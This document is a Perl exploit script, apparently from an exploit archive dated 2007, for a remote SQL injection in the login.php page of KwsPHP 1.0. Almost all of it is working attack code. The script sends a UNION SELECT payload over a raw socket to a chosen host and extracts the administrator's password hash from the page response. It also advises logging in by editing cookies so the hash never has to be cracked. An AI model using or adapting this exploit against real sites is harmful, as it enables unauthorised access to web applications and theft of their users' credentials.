###################################################
#  Script..........................: KwsPHP  ver 1.0 
#  Script Site..................: http://kws.koogar.org/
#  Vulnerability...............: login.php Remote SQL injection Exploit
#  Access.........................: Remote
#  level.............................: Dangerous
#  Author..........................: S4mi
#  Contact.........................: S4mi[at]LinuxMail.org
####################################################
#Special Greetz to : Simo64, DrackaNz, Coder212, Iss4m, HarDose, E.chark, r0_0t, ddx39 
#
####################################################
# This Exploit  work Only When magic_quotes_gpc Is OFF
#
#Usage  :       C:\Xploit.pl  127.0.0.1  /KswPHP/ admin
#Result Screen Shot :
#+**********************+
# Connecting ...[OK]
# Sending Data ...[OK]
#
#  + Exploit succeed! Getting admin information.
# + ---------------- +
# + Username: admin
# + Password: e10adc3949ba59abbe56e057f20f883e
###################################################

#!/usr/bin/perl

use IO::Socket ;

&header();

&usage unless(defined($ARGV[0] && $ARGV[1] && $ARGV[2]));

$host = $ARGV[0];
$path = $ARGV[1];
$user = $ARGV[2];


syswrite STDOUT ,"\n Connecting ...";

my $sock = new IO::Socket::INET ( PeerAddr => "$host",PeerPort => "80",Proto => "tcp",);
								
die "\n Unable to connect to $host\n" unless($sock);

syswrite STDOUT, "[OK]";

$inject = "union%20all%20select%200,pass,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20users%20where%20pseudo='$user'/*&pass=ZAZ&verifer=Se%20Loguer";	

syswrite STDOUT ,"\n Sending Data ...";

print $sock "POST $path/login.php?pseudo=%22$inject HTTP/1.1\n";
print $sock "Host: $host\n";
print $sock "Referer: $host\n";
print $sock "Accept-Language: en-us\n";
print $sock "Content-Type: application/x-www-form-urlencoded\n";
print $sock "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n";
print $sock "Cache-Control: no-cache\n";
print $sock "Connection: Close\n\n";

syswrite STDOUT ,"[OK]\n\n";

while($answer = <$sock>){

if ($answer =~ /class="messagelogin">(.*?) /){
print "+ Exploit succeed! Getting admin information.\n";
print "+ ----------------------- +\n";
print "+ Username: $user\n";
print "+ Password: $1\n";
print "+ -------Have Fun--------- +\n";
print "+ You don't need to crack the hash password :D\n";
print "+ Just login with ur owen information and edit the cookies\n";
}
}

sub usage{
	print "\nUsage   : perl $0 host /path/ UserName ";
	print "\nExemple : perl $0 www.victim.com /KwsPHP/ admin\n";
	exit(0);
}
sub header(){
print q(
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#  Script......................: KwsPHP  ver 1.0
#  Script Site.................: http://kws.koogar.org/
#  Vulnerability...............: Remote SQL injection Exploit
#  Access......................: Remote
#  level.......................: Dangerous
#  Author......................: S4mi
#  Contact.....................: S4mi[at]LinuxMail.org
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
);
}

# milw0rm.com [2007-09-15]
